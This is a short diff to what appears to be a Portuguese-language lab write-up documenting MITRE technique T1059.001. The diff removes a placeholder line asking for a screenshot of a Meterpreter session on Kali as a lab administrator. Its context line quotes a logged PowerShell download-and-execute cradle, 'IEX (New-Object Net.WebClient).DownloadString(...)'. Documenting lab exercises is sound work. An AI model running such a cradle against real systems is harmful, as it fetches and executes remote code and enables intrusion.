@@ -101,8 +101,6 @@ ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(...)
 
 **Evidência:**
 
-> Adicionar print: sessão Meterpreter activa no Kali como LAB\Administrator
-
 ![T1059.001 - Meterpreter Session](evidence/03-meterpreter-session.png)
 
 ---
